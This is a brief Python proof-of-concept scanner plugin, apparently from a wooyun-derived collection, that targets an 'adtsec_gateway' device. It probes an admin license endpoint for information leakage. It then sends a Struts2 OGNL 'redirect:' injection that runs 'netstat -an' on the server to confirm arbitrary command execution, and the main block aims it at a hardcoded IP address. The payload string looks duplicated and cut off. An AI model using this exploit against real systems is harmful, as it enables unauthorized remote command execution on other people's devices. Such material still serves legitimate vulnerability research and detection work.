#!/usr/bin/env python
#-*- coding:utf-8 -*-
#info:http://www.wooyun.org/bugs/wooyun-2015-0131408
import urlparse
def assign(service, arg):
    if service == 'adtsec_gateway':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'lan/admin_getLisence'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and 'currentpage' in res and 'maxresult' in res:
        security_hole('info reveal'+url)
    url = arg + 'lan/admin_getLisence?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java.io.BufferedReader(%23b),%23d%3dnew%20char[51020],%23c.read(%23d),%23screen%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter(),%23screen.println(%23d),%23screen.close()}%22%3Etest.action?redirect:${%23a%3dnew%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22netstat%22,%22-an%22}).start().getInputStream(),%23b%3dnew%20java.io.InputStreamReader(%23a),%23c%3dnew%20java'
    code, head, res, errcode, _ = curl.curl2(url)
    if code==200 and 'Active Internet connections' in res:
        security_hole('Arbitrary command execution'+url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('adtsec_gateway', 'http://124.128.80.170:8080/')[1])